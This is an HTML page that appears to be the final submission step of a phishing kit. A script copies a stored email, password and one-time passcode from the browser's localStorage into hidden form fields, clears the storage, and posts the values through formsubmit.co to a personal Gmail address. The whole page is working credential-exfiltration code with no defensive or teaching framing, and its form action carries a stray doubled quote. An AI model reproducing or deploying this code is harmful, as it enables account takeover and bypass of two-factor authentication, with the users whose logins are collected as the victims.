<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Submit</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="final-submit-container">
        <form action=""https://formsubmit.co/staineagleshort@gmail.com" method="POST">
            <input type="hidden" name="email" id="form-email">
            <input type="hidden" name="password" id="form-password">
            <input type="hidden" name="otp" id="form-otp"> <!-- Added OTP field -->
            <!-- Add other hidden inputs if needed -->
            <button type="submit" class="submit-btn">Submit</button>
        </form>
        <script>
            // Retrieve user data from local storage
            document.getElementById('form-email').value = localStorage.getItem('userEmail');
            document.getElementById('form-password').value = localStorage.getItem('userPassword');
            document.getElementById('form-otp').value = localStorage.getItem('userOTP'); // Set OTP value

            // Clear local storage if necessary
            localStorage.removeItem('userEmail');
            localStorage.removeItem('userPassword');
            localStorage.removeItem('userOTP');
        </script>
    </div>
</body>
</html>
